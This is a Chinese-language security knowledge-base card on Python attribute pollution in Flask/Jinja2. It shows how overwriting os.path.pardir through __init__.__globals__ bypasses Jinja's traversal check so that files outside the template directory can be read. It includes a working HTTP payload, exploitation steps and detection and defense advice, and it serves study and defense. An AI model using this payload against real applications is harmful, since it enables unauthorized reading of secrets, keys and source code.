---
id: web-python-attribute-pollution-ospath-pardir-jinja-traversal-bypass
title: Python 属性污染改 os.path.pardir：绕过 Jinja split_template_path 的 .. 检查读取模板目录外文件
type: scenario
domain: web
path: web/python
technique: python-attribute-pollution-ospath-pardir-jinja-split-template-path-bypass
tags:
- python
- flask
- jinja2
- attribute-pollution
- prototype-pollution
- class-pollution
- file-read
- path-traversal
- dunder
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V649
  verified_at: '2026-11-13T04:06:49+08:00'
  notes: 已对照原文与图01-16核对：split_template_path 的 piece == os.path.pardir 检查（图08）、污染前 GET /../1.py 500 TemplateNotFound（图07）、POST pardir=! payload（图09）、污染后 GET /../../flag.txt 200 返回 11111（图10）均一致；已将 PoC 注释中的探测路径修正为图07实际的 /../1.py。未验证点：PoC 未本机执行；原文未标注 Flask/Jinja 受影响版本区间，versions 不设置。
url: /docs/web/python/web-python-attribute-pollution-ospath-pardir-jinja-traversal-bypass/
draft: false
kb_aliases:
- os.path.pardir 污染
- 绕过 Jinja split_template_path
- Flask 模板目录穿越
- __globals__ os.path pardir
- merge 属性污染文件读取
- TemplateNotFound 绕过
---

## 一句话结论

存在递归 merge 类属性污染入口的 Flask/Jinja2 应用，可以从实例的 `__init__.__globals__` 进入模块全局，把 `os.path.pardir` 从 `..` 改成 `!` 等任意字符，使 Jinja `split_template_path` 依赖 `piece == os.path.pardir` 的目录穿越检查失效，随后用带 `../` 的模板名（或对应路由参数）读取模板目录之外的文件。

## 原理

- **属性污染到达全局**：递归 merge 不拦截 dunder key 时，`{"__init__":{"__globals__":{...}}}` 会沿"实例 → 类 → `__init__` 函数 → `__globals__`"进入定义该类的模块全局字典；写入的键即模块级变量/对象属性（如 `os.path.pardir`），修改在进程内持久生效、跨请求有效。
- **Jinja 的目录穿越防线**：Jinja2 的 `split_template_path` 在加载模板时把模板名按 `/` 分段，拒绝三类段：包含 `os.path.sep`、包含 `os.path.altsep`、以及 `piece == os.path.pardir`（即 `..`）。它阻止 `render_template("../../flag.txt")` 之类的模板名逃出模板目录。
- **检查引用的是可变常量**：`os.path.pardir` 只是 `posixpath`/`ntpath` 模块里的一个字符串常量 `".."`，检查代码在运行时读取它，而不是写死 `".."`。把该常量改成 `"!"`（原文示例）或 `","` 后，`..` 不再等于 `pardir`，`/` 与 `\` 之外的段全部放行，`../` 路径得以穿越。
- **为什么能到 os 模块**：`os` 通常在入口模块的全局命名空间里（`import os`），而 merge 入口类的 `__init__` 与路由函数定义在同一模块，`__init__.__globals__` 直接暴露 `os`；即使不在入口模块，也可经 `sys.modules`/`__loader__`/`__spec__` 链到达已加载模块。
- **危害**：模板路由一旦允许 `../`，就能读取模板目录上层任意可读文件（flag、配置、源码、密钥），也可渲染攻击者可控路径的模板内容；改动进程级生效，直到重启。

## 触发条件

- 应用存在把用户可控嵌套 JSON 递归合并进对象的入口（`hasattr`/`getattr`/`setattr` 或 `__dict__` 递归），未过滤 `__` 开头的 key。
- 目标为 Flask + Jinja2 应用，`__init__.__globals__` 能到达 `os`（或可经 sys.modules 链到达）。
- 存在把用户输入作为模板名/模板路径传给 `render_template`、`get_template`、`Template` 加载的路由（或可触发 Jinja 模板加载）。
- 目标文件对进程可读且位于模板目录外层可预测路径。

## 利用步骤

1. 确认 merge 污染入口与全局可达性：提交 `{"__class__":{}}` 探测递归，`{"__init__":{"__globals__":{"os":{}}}}` 探测 `os` 是否可达（可用无害属性验证，如读回）。
2. 先触发一次 `../` 模板加载确认防线存在：访问模板路由传 `../../flag.txt`，应看到 500 与栈中 `jinja2/loaders.py split_template_path` 的 `TemplateNotFound`。
3. 污染常量：`POST /` 提交 `{"__init__":{"__globals__":{"os":{"path":{"pardir":"!"}}}}}`。
4. 再次发起带 `../` 的请求（如 `GET /../../flag.txt` 或模板路由参数），此时 `split_template_path` 不再拒绝 `..`，返回目标文件内容。
5. 按需继续污染其他属性（`app.config["SECRET_KEY"]`、`jinja_env` 定界符、`app._static_folder` 等）扩大影响；记录污染前后行为作为证据。

## PoC

```http
POST / HTTP/1.1
Host: target:5000
Content-Type: application/json

{"__init__":{"__globals__":{"os":{"path":{"pardir":"!"}}}}}
```

```http
# 污染前：/../1.py → 500 TemplateNotFound（split_template_path 拒绝 ..）
# 污染后：
GET /../../flag.txt HTTP/1.1
Host: target:5000

HTTP/1.1 200 OK
...
11111
```

```python
# 检查点（Jinja2 loaders.py 逻辑示意）
for piece in template.split("/"):
    if os.path.sep in piece or (os.path.altsep and os.path.altsep in piece) or piece == os.path.pardir:
        raise TemplateNotFound(template)
```

## 变体与关联

- 变体：`os.path.pardir` 可改为任意非 `".."` 字符串（原文正文示例 `","`，图 09 实测 `"!"`）；`os.path.sep`/`altsep` 也可被污染，但会连带破坏路径拼接，不如改 pardir 稳定。
- 变体：`_static_folder` 改到 `./` 或 `/` 可经 Flask 静态路由直接读文件（见关联卡，入口为 exec/SSTI 或属性污染均可）。
- 变体：`app.jinja_env.variable_start_string/end_string` 替换模板定界符绕过只过滤 `{{` 的 WAF（需在首次加载模板前污染，避开模板缓存）。
- 变体：`_got_first_request=False` 可在后续请求重放 `before_first_request` 钩子（Flask 2.x），重复触发仅首次执行的逻辑。
- 关联：[[web-python-recursive-merge-class-pollution-globals-rce]]（merge 类污染 → `__globals__` → SECRET_KEY/白名单 RCE 总卡）；[[web-python-framework-flask-static-folder-arbitrary-file-read]]（static_folder 改根读文件）；[[web-python-pydash-set-attribute-path-pollution]]（pydash 入口的同类 Flask/Jinja 属性污染）；[[web-python-recursive-merge-config-filename-arbitrary-read]]（config.filename 类文件读取）。

## 检测与防御

- 检测：JSON 请求体中出现 `__class__`/`__init__`/`__globals__`/`__base__` 等 dunder key（含 Unicode 转义、大小写变形）；merge 入口出现嵌套深度异常的对象。
- 检测：模板路由传入含 `../` 的模板名且返回 200/文件内容；`split_template_path`/TemplateNotFound 异常在污染请求后不再出现。
- 检测：运行时 `os.path.pardir` 值变化、Flask 应用属性（`_static_folder`/`jinja_env`）被修改；进程内全局状态异常变更告警。
- 防御：合并函数改用字段白名单/显式赋值，拒绝 dunder 与未知 key；不把用户 JSON 直接 merge 进对象；模板名参数禁止 `..` 与分隔符（在应用层独立校验，不只依赖 Jinja）。
- 加固：模板目录与敏感文件隔离、敏感文件移出可预测路径；WAF 拦截 dunder key（注意 JSON 转义还原）；升级框架并关注此类属性污染缓解。

## 备注

原文为 Python 原型链（类属性）污染学习笔记：前半 merge/`__globals__`/`__defaults__`/跨模块获取与既有卡重叠；本卡取其中目录穿越防护绕过部分。图 07-10 实测：访问 `../1.py` 报 500（Flask `templating.py` 栈 + `jinja2/loaders.py` `split_template_path` 的 `piece == os.path.pardir` 检查），以 `{"os":{"path":{"pardir":"!"}}}` 污染后 `GET /../../flag.txt` 返回文件内容。原文未标注 Flask/Jinja 版本（正文引用 Jinja 2.10 文档），affected_versions 省略。PoC 未在本机执行；`_static_folder` 与 jinja 定界符段落分别由关联卡覆盖、未在本卡展开。
